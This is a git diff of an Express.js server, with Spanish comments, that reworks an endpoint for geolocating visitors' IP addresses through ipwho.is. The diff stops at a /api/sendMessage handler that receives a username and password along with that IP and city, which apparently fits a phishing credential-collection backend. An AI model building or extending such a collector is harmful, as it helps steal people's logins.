@@ -32,27 +32,56 @@ app.get('/', (req, res) => {
 
 app.get('/api/get-location', async (req, res) => {
     try {
-        // La IP real del cliente viene en estos headers (Railway / proxies)
-        const clientIp = 
-            req.headers['cf-connecting-ip'] || 
-            req.headers['x-forwarded-for']?.split(',')[0]?.trim() || 
-            req.socket.remoteAddress || 
+        // Obtener IP del cliente (mejorado para proxies como Railway)
+        let clientIp = 
+            req.headers['cf-connecting-ip'] ||                  // Cloudflare
+            (req.headers['x-forwarded-for'] || '').split(',')[0].trim() ||
+            req.headers['x-real-ip'] ||
+            req.socket.remoteAddress ||
             'unknown';
 
-        const ipToUse = clientIp === '::1' || clientIp === '127.0.0.1' ? '8.8.8.8' : clientIp;
+        if (!clientIp || clientIp === '::1' || clientIp.includes('127.0.0.1') || clientIp === '::ffff:127.0.0.1') {
+            clientIp = '8.8.8.8'; // fallback para pruebas locales
+        }
 
-        const geoResponse = await axios.get(`https://ipapi.co/${ipToUse}/json/`);
-        
-        res.json({
-            ip: ipToUse,
-            city: geoResponse.data.city || 'Desconocida',
-            // puedes agregar más campos si quieres
+        // Opción 1: ipwho.is (muy estable, sin key, ilimitado o límite alto)
+        const geoResponse = await axios.get(`https://ipwho.is/${clientIp}`, {
+            timeout: 7000
         });
+
+        const data = geoResponse.data;
+
+        // Opción 2 (comentar la de arriba y descomentar si prefieres): ip-api.com
+        // const geoResponse = await axios.get(`http://ip-api.com/json/${clientIp}?fields=status,message,country,city,query`);
+        // const data = geoResponse.data;
+        // if (data.status !== 'success') throw new Error(data.message || 'ip-api falló');
+
+        res.json({
+            ip: clientIp,
+            city: data.city || data.region || 'Desconocida',
+            // extra si quieres: country: data.country || 'N/A'
+        });
+
     } catch (error) {
-        console.error('Error obteniendo ubicación:', error.message);
-        res.status(500).json({ ip: 'unknown', city: 'Desconocida' });
+        console.error('ERROR en /api/get-location:');
+        console.error('Mensaje:', error.message);
+        if (error.response) {
+            console.error('Status:', error.response.status);
+            console.error('Respuesta del servicio:', error.response.data);
+        } else if (error.request) {
+            console.error('No hubo respuesta (timeout o network issue)');
+        } else {
+            console.error('Error al preparar request:', error);
+        }
+
+        // Respuesta fallback para que el frontend no rompa
+        res.status(200).json({
+            ip: 'detectada-en-backend',
+            city: 'Desconocida'
+        });
     }
 });
+
 app.post('/api/sendMessage', async (req, res) => {
     const { user, password, ip, city } = req.body;
 
